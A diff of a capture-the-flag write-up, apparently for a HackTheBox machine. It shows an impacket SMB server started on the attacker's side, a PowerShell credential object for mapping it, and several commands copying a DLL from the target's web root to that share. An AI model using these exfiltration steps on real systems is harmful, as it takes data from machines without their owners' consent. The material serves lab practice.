@@ -9,7 +9,7 @@ So to copy the file let's fire up a SMB share and copy the .dll their
 impacket-smbserver Hackthebox $(pwd) -smb2support -user testing -password testing
 ```
 
-Get a NEW PSDrive 
+Get a NEW PS-Drive 
 So to do that we have to put the user and password in Credential Object.
 ```
 $pass = convertto-securestring 'testing' -AsPlainText -Force 
@@ -31,7 +31,11 @@ Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" -Destination "testing"
 ```
 
 
+```
+copy C:\inetpub\wwwroot\bin\MultimasterAPI.dll testing
+```
 
 
-
-
+```
+Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" -Destination "C:\Users\alcibiades\Documents"
+```
